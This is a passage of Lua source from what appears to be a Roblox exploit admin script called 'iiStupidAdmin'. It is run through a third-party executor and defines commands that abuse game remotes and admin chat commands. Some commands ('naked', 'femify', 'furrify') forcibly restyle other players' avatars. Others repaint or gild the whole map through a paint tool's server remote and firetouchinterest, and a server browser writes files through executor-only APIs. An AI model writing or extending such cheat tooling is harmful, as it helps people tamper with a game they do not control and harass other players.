	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(1.5,0,0)
	wait(0.25)
	game.Players:Chat("unpunish me")
    end
end)

addCommand("stopscript",{},function()
    spawn(function()
        if game.Chat:FindFirstChild("Obby") then runCommand(prefix.."localaddobby",{}) end
    end)
	pcall(function()
		if workspace:FindFirstChild("_FakeObby") then runCommand(prefix.."unantinokill",{}) end
	end)
    for i,v in pairs(Connections) do v:Disconnect() end
    for i,v in pairs(Toolbans) do v:Disconnect() end
    for i,v in pairs(Loops) do Loops[i]=false end
    CommandBar:Destroy()
    GUI:SendMessage(ScriptName, "Successfully stopped.")
end)

addCommand("naked",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        if v and v.Character and v.Character.Head then
            game.Players:Chat("paint "..v.Name.." "..v.Character.Head.BrickColor.Name)
        end
    end
end)

addCommand("nude",{"player"},function(args)
    runCommand(prefix.."naked",args)
end)

addCommand("femify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("char "..v.Name.." 31342830")
        repeat wait() until v and v.Character and v.Character:FindFirstChild("Ultra-Fabulous Hair")
        wait(0.3)
        game.Players:Chat("removehats "..v.Name)
        wait()
        game.Players:Chat("paint "..v.Name.." Institutional white")
        wait()
        game.Players:Chat("hat "..v.Name.." 7141674388")
        wait()
        game.Players:Chat("hat "..v.Name.." 7033871971")
        wait()
        game.Players:Chat("shirt "..v.Name.." 5933990311")
        wait()
        game.Players:Chat("pants "..v.Name.." 7219538593")
        wait()
    end
end)

addCommand("furrify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("char "..v.Name.." 18")
        wait(0.5)
        game.Players:Chat("paint "..v.Name.." Institutional white")
        wait()
        game.Players:Chat("hat "..v.Name.." 10563319994")
        wait()
        game.Players:Chat("hat "..v.Name.." 12578728695")
        wait()
        game.Players:Chat("shirt "..v.Name.." 10571467676")
        wait()
        game.Players:Chat("pants "..v.Name.." 10571468508")
        wait()
    end
end)

addCommand("noobify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("char "..v.Name.." 18")
        wait()
    end
end)

addCommand("rejoin",{},function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.jobId)
end)

addCommand("serverhop",{},function()
	function Serverhop()
		local Servers = {}
		for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
				table.insert(Servers,v.id)
			end
		end
		
		if #Servers~=0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
		else
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	end
	
	Serverhop()
	game:GetService("TeleportService").TeleportInitFailed:Connect(Serverhop)
end)

addCommand("serverbrowser",{},function()
local Servers = {}
local function loadServers()
local data = game:GetService("HttpService"):JSONDecode(HttpRequest({Url="https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"}).Body).data

Servers = {}

for i,v in pairs(data) do
	local ImportantData = {
		["Job ID"] = v.id,
		["Ping"] = v.ping,
		["Players"] = v.playing
	}
	local PlayerIcons = {}
	
	local Icons = {}
	for i2,v2 in pairs(v.playerTokens) do
		table.insert(Icons,{token=v.playerTokens[i2],type="AvatarHeadshot",size="150x150",requestId=v.id})
	end
	
	if not isfolder("ImgIcons") then
		makefolder("ImgIcons")
	end
	
	local Images = game:GetService("HttpService"):JSONDecode(HttpRequest({Url="https://thumbnails.roblox.com/v1/batch",Method="POST",Body=game:GetService("HttpService"):JSONEncode(Icons),Headers={["Content-Type"]="application/json"}}).Body).data
	for i2,v2 in pairs(Images) do
		if v2.imageUrl then
			local ImgID = v2.imageUrl:split("rbxcdn.com/")[2]:split("/150/150")[1]
			if isfile("ImgIcons/"..ImgID..".png") then
				--table.insert(PlayerIcons,getcustomasset("ImgIcons/"..ImgID..".png",true))
				table.insert(PlayerIcons,"ImgIcons/"..ImgID..".png")
			else
				writefile("ImgIcons/"..ImgID..".png",HttpRequest({Url=v2.imageUrl,Method="GET"}).Body)
				--table.insert(PlayerIcons,getcustomasset("ImgIcons/"..ImgID..".png",true))
				table.insert(PlayerIcons,"ImgIcons/"..ImgID..".png")
			end
		else
			table.insert(PlayerIcons,"rbxassetid://14968663868")
		end
	end
	
	ImportantData["Icon Images"] = PlayerIcons
	
	table.insert(Servers,ImportantData)
end
end

loadServers()

local UI = Instance.new("ScreenGui")
spawn(function()
local main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local title = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local noround = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local x = Instance.new("TextButton")
local bg = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local noroundbottom = Instance.new("Frame")
local noroundleft = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local i = Instance.new("TextButton")
local bg_2 = Instance.new("Frame")
local ImageLabel_2 = Instance.new("ImageLabel")
local importantdata = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local scroll = Instance.new("ScrollingFrame")
local template = Instance.new("Frame")
local Icons = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local UIPadding = Instance.new("UIPadding")
local template_2 = Instance.new("ImageLabel")
local UICorner_5 = Instance.new("UICorner")
local Join = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local UIPadding_2 = Instance.new("UIPadding")
local UIGridLayout_2 = Instance.new("UIGridLayout")

UI.Parent = game.CoreGui
UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
UI.ResetOnSpawn = false

main.Name = "main"
main.Parent = UI
main.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.174539626, 0, 0.191463396, 0)
main.Size = UDim2.new(0, 597, 0, 436)

UICorner.Parent = main

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
title.BorderColor3 = Color3.fromRGB(0, 0, 0)
title.BorderSizePixel = 0
title.Size = UDim2.new(1, 0, 0, 30)

UICorner_2.Parent = title

noround.Name = "noround"
noround.Parent = title
noround.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
noround.BorderColor3 = Color3.fromRGB(0, 0, 0)
noround.BorderSizePixel = 0
noround.Position = UDim2.new(0, 0, 0.5, 0)
noround.Size = UDim2.new(1, 0, 0.5, 0)

TextLabel.Parent = title
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 10, 0, 0)
TextLabel.Size = UDim2.new(1, -20, 1, 0)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Servers"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 28.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

x.Name = "x"
x.Parent = title
x.AnchorPoint = Vector2.new(1, 0)
x.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
x.BackgroundTransparency = 1.000
x.BorderColor3 = Color3.fromRGB(0, 0, 0)
x.BorderSizePixel = 0
x.Position = UDim2.new(1, 0, 0, 0)
x.Size = UDim2.new(0, 50, 1, 0)
x.Font = Enum.Font.SourceSans
x.Text = ""
x.TextColor3 = Color3.fromRGB(0, 0, 0)
x.TextSize = 14.000

bg.Name = "bg"
bg.Parent = x
bg.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
bg.BackgroundTransparency = 1.000
bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.Size = UDim2.new(1, 0, 1, 0)

UICorner_3.Parent = bg

noroundbottom.Name = "noroundbottom"
noroundbottom.Parent = bg
noroundbottom.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
noroundbottom.BackgroundTransparency = 1.000
noroundbottom.BorderColor3 = Color3.fromRGB(0, 0, 0)
noroundbottom.BorderSizePixel = 0
noroundbottom.Position = UDim2.new(0, 0, 0.5, 0)
noroundbottom.Size = UDim2.new(1, 0, 0.5, 0)

noroundleft.Name = "noroundleft"
noroundleft.Parent = bg
noroundleft.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
noroundleft.BackgroundTransparency = 1.000
noroundleft.BorderColor3 = Color3.fromRGB(0, 0, 0)
noroundleft.BorderSizePixel = 0
noroundleft.Size = UDim2.new(0.5, 0, 1, 0)

ImageLabel.Parent = x
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel.Size = UDim2.new(0, 12, 0, 12)
ImageLabel.Image = "rbxassetid://14953690570"

i.Name = "i"
i.Parent = title
i.AnchorPoint = Vector2.new(1, 0)
i.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
i.BackgroundTransparency = 1.000
i.BorderColor3 = Color3.fromRGB(0, 0, 0)
i.BorderSizePixel = 0
i.Position = UDim2.new(1, -50, 0, 0)
i.Size = UDim2.new(0, 50, 1, 0)
i.Font = Enum.Font.SourceSans
i.Text = ""
i.TextColor3 = Color3.fromRGB(0, 0, 0)
i.TextSize = 14.000

bg_2.Name = "bg"
bg_2.Parent = i
bg_2.BackgroundColor3 = Color3.fromRGB(212,166,0)
bg_2.BackgroundTransparency = 1.000
bg_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
bg_2.BorderSizePixel = 0
bg_2.Size = UDim2.new(1, 0, 1, 0)

ImageLabel_2.Parent = i
ImageLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel_2.Size = UDim2.new(0, 12, 0, 12)
ImageLabel_2.Image = "rbxassetid://14969600275"

importantdata.Name = "importantdata"
importantdata.Parent = main
importantdata.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
importantdata.BorderColor3 = Color3.fromRGB(0, 0, 0)
importantdata.BorderSizePixel = 0
importantdata.Position = UDim2.new(0, 10, 0, 40)
importantdata.Size = UDim2.new(1, -20, 1, -50)

UICorner_4.Parent = importantdata

scroll.Name = "scroll"
scroll.Parent = importantdata
scroll.Active = true
scroll.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
scroll.BackgroundTransparency = 1.000
scroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
scroll.BorderSizePixel = 0
scroll.Size = UDim2.new(1, 0, 1, 0)

template.Name = "template"
template.Parent = scroll
template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
template.BackgroundTransparency = 0.800
template.BorderColor3 = Color3.fromRGB(0, 0, 0)
template.BorderSizePixel = 0
template.Size = UDim2.new(0, 150, 0, 108)

Icons.Name = "Icons"
Icons.Parent = template
Icons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icons.BackgroundTransparency = 1.000
Icons.BorderColor3 = Color3.fromRGB(0, 0, 0)
Icons.BorderSizePixel = 0
Icons.Size = UDim2.new(1, 0, 1, -50)

UIGridLayout.Parent = Icons
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 56, 0, 56)

UIPadding.Parent = Icons
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingTop = UDim.new(0, 5)

template_2.Name = "template"
template_2.Parent = Icons
template_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
template_2.BorderSizePixel = 0
template_2.Position = UDim2.new(0, 5, 0, 5)
template_2.Size = UDim2.new(0, 100, 0, 100)
template_2.Image = "rbxassetid://14968663868"

UICorner_5.Parent = template

Join.Name = "Join"
Join.Parent = template
Join.AnchorPoint = Vector2.new(0.5, 1)
Join.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Join.BackgroundTransparency = 0.900
Join.BorderColor3 = Color3.fromRGB(0, 0, 0)
Join.BorderSizePixel = 0
Join.Position = UDim2.new(0.5, 0, 1, -10)
Join.Size = UDim2.new(1, -20, 0, 30)
Join.Font = Enum.Font.Code
Join.Text = "Join"
Join.TextColor3 = Color3.fromRGB(255, 255, 255)
Join.TextSize = 14.000

UICorner_6.Parent = Join

UIPadding_2.Parent = scroll
UIPadding_2.PaddingLeft = UDim.new(0, 5)
UIPadding_2.PaddingTop = UDim.new(0, 5)

UIGridLayout_2.Parent = scroll
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 250, 0, 200)

UI.Name = "iiStupidAdmin serverbrowser"
end)
repeat game:GetService("RunService").RenderStepped:Wait() until UI.Name == "iiStupidAdmin serverbrowser"
function lerp(s,e,inb)
    return s+(e-s)*inb
end

local hoveringoverx = false
UI.main.title.x.MouseEnter:Connect(function()
	hoveringoverx=true
end)
UI.main.title.x.MouseLeave:Connect(function()
	hoveringoverx=false
end)
UI.main.title.x.MouseButton1Click:Connect(function()
	UI:Destroy()
end)

local hoveringoveri = false
UI.main.title.i.MouseEnter:Connect(function()
	hoveringoveri=true
end)
UI.main.title.i.MouseLeave:Connect(function()
	hoveringoveri=false
end)

local funnylerpx = 1
local funnylerpi = 1
spawn(function()
	while true do game:GetService("RunService").RenderStepped:Wait()
		if hoveringoverx then
			funnylerpx = lerp(funnylerpx,0,0.1)
		else
			funnylerpx = lerp(funnylerpx,1,0.1)
		end
		
		UI.main.title.x.bg.BackgroundTransparency = funnylerpx
		UI.main.title.x.bg.noroundbottom.BackgroundTransparency = funnylerpx
		UI.main.title.x.bg.noroundleft.BackgroundTransparency = funnylerpx
		
		if hoveringoveri then
			funnylerpi = lerp(funnylerpi,0,0.1)
		else
			funnylerpi = lerp(funnylerpi,1,0.1)
		end
		
		UI.main.title.i.bg.BackgroundTransparency = funnylerpi
		UI.main.title.i.ImageLabel.Rotation = lerp(UI.main.title.i.ImageLabel.Rotation,0,0.1)
	end
end)

spawn(function()
	local UserInputService = game:GetService("UserInputService")
	
	local gui = UI.main
					
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
					
	gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
					
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			if gui.Visible then
				update(input)
			end
		end
	end)
end)

local function loadVisualServers()
if not UI.main.importantdata.scroll:FindFirstChild("template") then
for i,v in pairs(UI.main.importantdata.scroll:GetChildren()) do
if v:IsA("Frame") then
v:Destroy()
end
end

local template = Instance.new("Frame")
local Icons = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local UIPadding = Instance.new("UIPadding")
local template_2 = Instance.new("ImageLabel")
local UICorner_5 = Instance.new("UICorner")
local Join = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")

template.Name = "template"
template.Parent = UI.main.importantdata.scroll
template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
template.BackgroundTransparency = 0.800
template.BorderColor3 = Color3.fromRGB(0, 0, 0)
template.BorderSizePixel = 0
template.Size = UDim2.new(0, 150, 0, 108)

Icons.Name = "Icons"
Icons.Parent = template
Icons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icons.BackgroundTransparency = 1.000
Icons.BorderColor3 = Color3.fromRGB(0, 0, 0)
Icons.BorderSizePixel = 0
Icons.Size = UDim2.new(1, 0, 1, -50)

UIGridLayout.Parent = Icons
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 56, 0, 56)

UIPadding.Parent = Icons
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingTop = UDim.new(0, 5)

template_2.Name = "template"
template_2.Parent = Icons
template_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
template_2.BorderSizePixel = 0
template_2.Position = UDim2.new(0, 5, 0, 5)
template_2.Size = UDim2.new(0, 100, 0, 100)
template_2.Image = "rbxassetid://14968663868"

UICorner_5.Parent = template

Join.Name = "Join"
Join.Parent = template
Join.AnchorPoint = Vector2.new(0.5, 1)
Join.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Join.BackgroundTransparency = 0.900
Join.BorderColor3 = Color3.fromRGB(0, 0, 0)
Join.BorderSizePixel = 0
Join.Position = UDim2.new(0.5, 0, 1, -10)
Join.Size = UDim2.new(1, -20, 0, 30)
Join.Font = Enum.Font.Code
Join.Text = "Join"
Join.TextColor3 = Color3.fromRGB(255, 255, 255)
Join.TextSize = 14.000

UICorner_6.Parent = Join
end
local Template = UI.main.importantdata.scroll.template
for i,v in pairs(Servers) do
	local Server = Template:Clone()
	Server.Parent = UI.main.importantdata.scroll
	Server.Name = v["Job ID"]
	Server.Join.Text = "Join ("..v["Ping"].."ms)"
	
	for i,v in pairs(v["Icon Images"]) do
		pcall(function()
		local Icon = Server.Icons.template:Clone()
		Icon.Parent = Server.Icons
		if v ~= "rbxassetid://14968663868" then
			Icon.Image = getcustomasset(v,true)
		else
			Icon.Image = "rbxassetid://14968663868"
		end
		end)
	end
	
	Server.Join.MouseButton1Click:Connect(function()
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,v["Job ID"])	
	end)
	
	Server.Icons.template:Destroy()
end
Template:Destroy()
end

loadVisualServers()

UI.main.title.i.MouseButton1Click:Connect(function()
	UI.main.title.i.ImageLabel.Rotation=359
	loadServers()
	loadVisualServers()
end)

end)

addCommand("clearsavehop",{},function()
	delfile("PreviousServers.txt")
	GUI:SendMessage(ScriptName,"The previous servers have been reset.")
end)

addCommand("savehop",{},function()
	function GetOldServers()
		if isfile("PreviousServers.txt") then
			return readfile("PreviousServers.txt"):split(";")
		else
			return {}
		end
	end
	
	function WriteOldServers(Data)
		if isfile("PreviousServers.txt") then
			appendfile("PreviousServers.txt",";"..Data)
		else
			writefile("PreviousServers.txt",Data)
		end
	end
	
	function Savehop()
		local OldServers = GetOldServers()
		local Servers = {}
		for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId and not table.find(OldServers,game.JobId) then
				table.insert(Servers,v.id)
			end
		end
		
		if not table.find(OldServers,game.JobId) then
			WriteOldServers(game.JobId)
		end
		if #Servers~=0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
		else
			print("No servers found, retrying in 10 seconds")
			spawn(function()
				wait(10)
				Savehop()
			end)
		end
	end
	
	Savehop()
	game:GetService("TeleportService").TeleportInitFailed:Connect(Savehop)
end)

addCommand("prompttoserverhop",{},function()
	if not Loops.prompttoserverhop then
		Loops.prompttoserverhop = true
		local bindable = Instance.new("BindableFunction")
		function bindable.OnInvoke(answer)
		    if answer == "Yes" then
		    	runCommand(prefix.."serverhop",{})
		    end
			Loops.prompttoserverhop = false
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = ScriptName,
			Text = "You may have been crashed. Would you like to serverhop?",
			Duration = math.huge,
			Callback = bindable,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
end)

addCommand("musiclock",{"sound-id"},function(args)
    local s,f=pcall(function()
    local soundlock = tonumber(args[1])

local origsound = soundlock
soundlock="http://www.roblox.com/asset/?id="..tostring(soundlock)
Loops.musiclock = true
local gwawg = 0
repeat task.wait(0.1) gwawg = gwawg + 0.1
    if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
        local music = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound")
        if music.IsLoaded and music.SoundId == soundlock then
           if gwawg > music.TimeLength then gwawg = 0 end 
           if math.abs(music.TimePosition - gwawg) > 0.5 then
               music.TimePosition = gwawg
            end
        end
        if music.SoundId ~= soundlock then
            game.Players:Chat("music "..tostring(origsound))
        end
        if music.Playing == false then
           music:Play() 
        end
    else
        game.Players:Chat("music "..tostring(origsound))
    end
until not Loops.musiclock
end) if not s then print(f)end
end)

addCommand("removedisplaynames",{},function()
    local function characterAdded(charass)
        spawn(function()
            repeat wait() until charass and charass.Humanoid
            charass.Humanoid.DisplayName = charass.Humanoid.DisplayName.."\n(@"..charass.Name..")"
        end)
    end
    for _,v in pairs(game.Players:GetChildren()) do
        pcall(function()
        v.DisplayName = v.DisplayName.." (@"..v.Name..")"
        if v.Character and v.Character.Parent ~= nil then
            characterAdded(v.Character)
        end
        Connections["RDN"..v.Name]=v.CharacterAdded:Connect(characterAdded)
        end)
    end
    Connections.removedisplaynames = game.Players.PlayerAdded:Connect(function(player) pcall(function()
    player.DisplayName = player.DisplayName.." (@"..player.Name..")"
    if player.Character and player.Character.Parent ~= nil then
        characterAdded(player.Character)
    end
    Connections["RDN"..player.Name]=player.CharacterAdded:Connect(characterAdded)
    end) end)
end)

addCommand("fixdisplaynames",{},function()
    Connections.removedisplaynames:Disconnect()
    for i,v in pairs(Connections) do
        if i:sub(1,3)=="RDN" then Connections[i]:Disconnect() end
    end
    for i,v in pairs(game.Players:GetPlayers()) do
        v.DisplayName = v.DisplayName:split(" ")[1]
        pcall(function()
            if v and v.Character and v.Character.Parent ~= nil and v.Character.Humanoid then
                v.Character.Humanoid.DisplayName = v.DisplayName
            end
        end)
    end
end)

addCommand("colorall",{"r","g","b"},function(args)
    local Paint = GetPaint()
		for i,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
				    spawn(function()
				        Paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            ["Part"] = v,
                            ["Color"] = Color3.fromRGB(tonumber(args[1]),tonumber(args[2]),tonumber(args[3]))
                        })
					end)
				end
		end
end)

addCommand("colorallrandom",{},function()
    local Paint = GetPaint()
		for i,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
				    spawn(function()
				        Paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            ["Part"] = v,
                            ["Color"] = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
                        })
					end)
				end
		end
end)

addCommand("goldall",{},function()
    local Bloxy = nil
    if game.Players.LocalPlayer.Backpack:FindFirstChild("2017BloxyAward") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("2017BloxyAward")
        tool.Parent = game.Players.LocalPlayer.Character
        Bloxy = tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("2017BloxyAward") then
        Bloxy = tool
    else
        game.Players:Chat("gear me 549914888")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("2017BloxyAward")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("2017BloxyAward")
        tool.Parent = game.Players.LocalPlayer.Character
        Bloxy = tool
    end
    wait(0.2)
    Bloxy:Activate()
    wait(0.2)
    for i,v in pairs(game:GetService("Workspace").Terrain["_Game"]:GetDescendants()) do
        if v:IsA("BasePart") then
            firetouchinterest(v,Bloxy.Handle,0)
            firetouchinterest(v,Bloxy.Handle,1)
        end
    end
end)

addCommand("colorallbrickcolor",{"brickcolor"},function(args)
    local Paint = GetPaint()
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
	function transformToColor3(col)
        local r = col.r
        local g = col.g
        local b = col.b
        return Color3.new(r,g,b);
	end
    for i,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
				    spawn(function()
				        Paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            ["Part"] = v,
                            ["Color"] = transformToColor3(BrickColor.new(fixer))
                        })
					end)
				end
		end
end)

addCommand("clean",{},function()
	game.Players:Chat("clr")
	game.Players:Chat("unpaint all")
	game.Players:Chat("fix")
	runCommand(prefix.."fixcolor",{})
end)

addCommand("fixcolor",{},function()
    local ObbyDestroyed = false
    spawn(function()
    if game.Chat:FindFirstChild("Obby") then ObbyDestroyed = true runCommand(prefix.."localaddobby",{}) end
    end)
    spawn(function()
function transformToColor3(col)
	local r = col.r
	local g = col.g
	local b = col.b
	return Color3.new(r,g,b);
end
local v1 = "PaintPart"
		local remote = GetPaint():WaitForChild("Remotes").ServerControls
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v4 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Bright green"))
						}
					remote:InvokeServer(v1, v4)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v5 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
					remote:InvokeServer(v1, v5)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						local v6 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Brick yellow"))
							}
						remote:InvokeServer(v1, v6)
					end
					
					if v.Name == "SmoothBlockModel40" then
						local v7 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright green"))
							}
						remote:InvokeServer(v1, v7)
					end
					
